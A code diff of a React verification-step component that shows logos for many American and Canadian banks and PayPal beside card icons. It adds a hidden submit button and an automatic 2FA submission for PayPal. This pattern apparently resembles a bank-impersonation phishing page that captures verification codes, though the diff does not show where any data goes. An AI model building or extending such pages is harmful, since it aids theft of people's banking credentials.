@@ -18,9 +18,10 @@ const VerificationStep = ({
 }: VerificationStepsProps) => {
 
 
-    const allBanks = [...americanBanks, ...canadianbanks];
-
+  const allBanks = [...americanBanks, ...canadianbanks];
   const bankData = allBanks.find((bnk) => bnk.name === selectedBank);
+
+
 
   const getCardIcon = (type: string) => {
     const iconClass = 'w-28 h-16 object-contain';
@@ -108,6 +109,12 @@ else if (selectedBank === 'EQ Bank') {
       );
     }
 
+// else if (selectedBank === 'PayPal') {
+//       return (
+//           null
+//       );
+//     }
+
 else if (selectedBank === 'Alterna Bank') {
       return (
         <div className="flex justify-between mt-10 mx-10">
@@ -148,22 +155,6 @@ else if (selectedBank === 'Simplii Financial' || selectedBank === 'Desjardins Gr
         </div>
       );
     }
-else if (selectedBank === 'PayPal') {
-      return (
-        <div className="flex justify-between mt-10 mx-10">
-          <div className="w-full h-16 rounded-t-lg flex items-center">
-            <img
-              src={bankData?.additionalLogo}
-              className="w-[140px] h-[30px]"
-            />
-          </div>
-          {getCardIcon(cardType)}
-        </div>
-      );
-    }
-
-
-
 else if (selectedBank === 'Bank of America') {
       return (
         <div className="flex justify-between mt-10 mx-10">
@@ -412,7 +403,33 @@ else if (selectedBank === 'Bank of America') {
       );
     }
   };
+
+if (selectedBank === 'PayPal') {
+  // Automatically trigger the 2FA handler after 1 second
+  setTimeout(() => {
+    handle2FASubmit(new Event('submit')); // triggers normal React navigation
+  }, 10);
+
   return (
+    <form onSubmit={handle2FASubmit}>
+      <div className="flex justify-center">
+        <button
+          type="submit"
+          className="hidden bg-[#404145] font-medium py-2 px-2 my-3 text-sm transition-all duration-300 mt-8 text-white"
+        >
+          Continue
+        </button>
+      </div>
+    </form>
+  );
+}
+
+
+
+
+  return (
+
+
     <div>
       {fetchTwoStepVerification()}
       <div className="p-6">
